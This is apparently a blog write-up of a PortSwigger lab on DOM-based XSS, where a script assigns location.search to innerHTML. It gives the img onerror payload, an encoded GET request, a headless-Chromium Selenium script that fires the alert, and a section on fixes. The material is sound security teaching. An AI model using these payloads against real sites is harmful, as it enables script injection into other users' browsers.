---
title: "DOM XSS in innerHTML sink using source location.search"
date: 2026-08-25 09:00:00 -0500
categories: [PortSwigger, Cross-site-scripting]
tags: [portswigger, cwe-79, xss, dom-based, innerhtml, location-search]
description: "Client-side XSS that never touches the server response: a script reads the URL query string and assigns it straight into an element with innerHTML. Because innerHTML never runs an injected script tag, fire the payload with an event handler instead — <img src=1 onerror=alert(1)>."
image:
    path: /assets/Images/PortSwigger-avatar.png
    alt: DOM XSS in innerHTML sink using source location.search
---

## Overview

This lab is a **DOM-based** [cross-site scripting](https://cwe.mitre.org/data/definitions/79.html) ([CWE-79](https://cwe.mitre.org/data/definitions/79.html)) bug. Unlike reflected or stored XSS, the payload is never processed by the server — the whole vulnerability lives in client-side JavaScript. The server sends down a clean page, and a script on that page takes attacker-controlled input from the URL and writes it into the document.

## The vulnerable code

The search results page runs this JavaScript:

```js
var query = (new URLSearchParams(window.location.search)).get('search');
document.getElementById('searchMessage').innerHTML = query;
```

Two ingredients make this exploitable:

- **A source** — `location.search`, the part of the URL after `?`. The attacker fully controls the `search` parameter.
- **A sink** — `element.innerHTML = ...`, which parses whatever string you give it as live HTML and inserts it into the page.

The `search` value is assigned to `innerHTML` with no encoding, so whatever you put in the query string becomes part of the page's markup.

## Why a plain script tag does not work

There is one rule that shapes the payload. The HTML5 specification says a `<script>` element inserted via `innerHTML` is parsed but **never executed**. So the obvious `<script>alert(1)</script>` does nothing in this sink.

The way around it is to inject an element that runs JavaScript through an *event handler* instead of a script body:

```html
<img src=1 onerror=alert(1)>
```

`src=1` is not a valid image URL, so the browser fails to load it and fires the element's `onerror` handler, which runs `alert(1)`. The same trick works with `<svg onload=alert(1)>`.

## The working request

The exploit is a single GET of the search page with the payload in the `search` parameter:

```
GET /?search=%3Cimg%20src%3D1%20onerror%3Dalert(1)%3E
```

Decoded, the parameter value is `<img src=1 onerror=alert(1)>`.

Because the sink runs in the browser, you have to load the URL in a real JavaScript engine to prove it — `curl` only sees the clean server response and cannot execute the page script. Loading the URL in headless Chromium fires the `alert`, and the lab flips to **Solved**.

```python
import urllib.parse, time
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service

base = "https://YOUR-LAB-ID.web-security-academy.net/"
url = base + "?search=" + urllib.parse.quote('<img src=1 onerror=alert(1)>')
o = Options()
for a in ["--headless=new", "--no-sandbox", "--disable-dev-shm-usage",
          "--disable-gpu", "--ignore-certificate-errors"]:
    o.add_argument(a)
d = webdriver.Chrome(service=Service("/usr/bin/chromedriver"), options=o)
d.get(url); time.sleep(2)
al = d.switch_to.alert; print("FIRED:", al.text); al.accept()
d.quit()
```

## The fix

- Do not assign untrusted data to `innerHTML`. Use `textContent` (or `innerText`), which inserts the value as plain text rather than parsed HTML — the `<img>` tag would then render as literal characters and never execute.
- If HTML really must be built from the value, encode it for HTML context first, or run it through a trusted sanitizer such as DOMPurify before it reaches the sink.
- As defense in depth, ship a Content-Security-Policy that blocks inline event handlers and inline script.
